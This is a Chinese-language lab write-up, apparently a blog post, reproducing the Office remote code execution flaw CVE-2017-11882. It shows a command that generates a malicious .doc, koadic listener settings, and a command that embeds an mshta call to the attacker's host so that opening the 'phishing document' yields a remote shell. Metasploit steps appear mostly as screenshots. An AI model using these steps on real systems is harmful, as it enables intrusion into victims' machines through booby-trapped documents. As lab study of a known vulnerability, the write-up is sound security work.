# CVE-2017-11882（Office 远程代码执行） - 浅笑 996 - 博客园

> 原文：[`www.cnblogs.com/qianxiao996/p/13574652.html`](https://www.cnblogs.com/qianxiao996/p/13574652.html)

测试环境：win7+kali+office 2007 xp+kali+office 2003
win7 ip:10.10.1.144 xp ip: 10.10.1.126 kali ip 10.10.1.67

### 一． 简单测试弹出计算器（xp)

#### 1.在 kali 下执行生成一个含有恶意代码的 doc 进行测试：

```
PythonCommand109b_CVE-2017-11882 -c “cmd.exe /c calc.exe” -o test.doc 
```

这条指令的意思是调用 cmd 并执行 calc.exe（即计算器）
![在这里插入图片描述](img/aeb2e40de69de9c8cd457a2552491fa7.png)

#### 2.在靶机上打开就会弹出计算器：

![在这里插入图片描述](img/7f380150b05c0f59c906e741f54a5f09.png)

### 二． 通过 koadic 漏洞复现(xp)

#### 1.下载 koadic 并启用

[`github.com/backlion/koadic.git`](https://github.com/backlion/koadic.git)

#### 2.执行./koadice

![在这里插入图片描述](img/fb3c731a9c235a4709dac4fe9075a94e.png)
首先看一下 koadic 怎么用直接
![在这里插入图片描述](img/b92a1caf13c327459e8750203aa9c76c.png)

#### 3.接下来设置 shell 的接受地址以及端口

```
Set lhost 10.10.1.67
Set lport 55555
Run 
```

![在这里插入图片描述](img/11339e8b04830854f6c57558188f77b3.png)
这儿需要注意的是生成的网址需要记住，以方便后面应用
接下来通过 poc 生成一个含有恶意代码的 doc 文件

```
python Command109b_CVE-2017-11882.py -c “mshtahttp://10.10.1.67:55555/Ly348” -o exploit.doc 
```

![在这里插入图片描述](img/12b48f094ae113de853165b0e606b0fe.png)
接下来在目标主机打开钓鱼文档
切回 koadic 则发现发生变化
![在这里插入图片描述](img/0e5a043fdc4eef163240d1fbd4245041.png)
这个时候说明入侵成功并已经反弹 shell
接下来在 koadic 执行 zombies 0 切换到项目
![在这里插入图片描述](img/e76b8be05ea954f30e26ef0aac5505ca.png)
接下来用 cmdshell 模块
输入 cmdshell 0
![在这里插入图片描述](img/da64fed0f280a061d51e706df2d9acad.png)
这就已经进去 cmd 了接下来可以愉快的玩耍了
![在这里插入图片描述](img/294641ef15df33b540117637ac518085.png)
![在这里插入图片描述](img/80df8594c6c2f03589536f8d325506a4.png)

### 三． 通过 msf 的 ps_shell 模块 漏洞复现(win7)

#### 1.启动 msfconsole

![在这里插入图片描述](img/988c1adedec6c0aa58cf2a26f508c2ff.png)

#### 2.查找对应的模块 search PS_shell

![在这里插入图片描述](img/ddd781298a5f05d59a147b5b0a4e69b6.png)
![在这里插入图片描述](img/2fc7b8b49bebca64dc610ac67e4ace29.png)

#### 3.利用 msf 生成利用的 powershell 脚本

![在这里插入图片描述](img/05ace8a528a1691f60ff7577ea3fe656.png)

![在这里插入图片描述](img/a294f78aeae91d9c661c50866affbef2.png)
![在这里插入图片描述](img/70cd00cef48878b593770534cfd94287.png)
![在这里插入图片描述](img/33870661897a71fa9463074b2701130a.png)
![在这里插入图片描述](img/4433605b3f48079ab243d8450f033990.png)
提示一点 在这儿的 Command109b_CVE-2017-11882 是 109 字节限制的 当然也有 43 字节的
1.接接下来在靶机打开测试文档就好
2.切换回 kali 会出现
![在这里插入图片描述](img/d01920b1fbf081737f8df5c8e8bc9469.png)
说明已经建立链接了
接下来输入 sessions -i 查看一下
![在这里插入图片描述](img/aa23ed08887403b66ce7d0f41bf6154b.png)
接下来切换进入
![在这里插入图片描述](img/3bd23cc23ab8ef1b096e9a3a1bfa10d0.png)
这个时候就已经入侵到靶机了。
![在这里插入图片描述](img/cbde7e9c541242cc6836d4614faadd7a.png)

### 四． 通过 hta_server 模块复现(xin7)

#### 1.在 msf 搜索 hta_server 模块

![在这里插入图片描述](img/8b14937fbed72087e28cd99617be93a6.png)

#### 2.进行设置

![在这里插入图片描述](img/fa9c2d1283a6ee6cb2beb47924ad1474.png)
![在这里插入图片描述](img/9b236315fde38aa878c2f6de9d950575.png)
![在这里插入图片描述](img/3d180b538c7f1a419c54ec33dd0b918e.png)

#### 3.在 kali 上生成带有恶意命令的 doc

![在这里插入图片描述](img/1673e69557cae1810a10571cdd816f63.png)

#### 4.在靶机上打开 test.doc 文档 切换回 kal

![在这里插入图片描述](img/2bc2b00841d8c1aeb100877efa83a65a.png)

![在这里插入图片描述](img/3a82f4dac1e8f2cd823607dfb548a7a0.png)
（之后的过程就和之前一样了，就不多啰嗦了）。
(ps:后两种是利用了 powershell，所以在 win7 下测试的）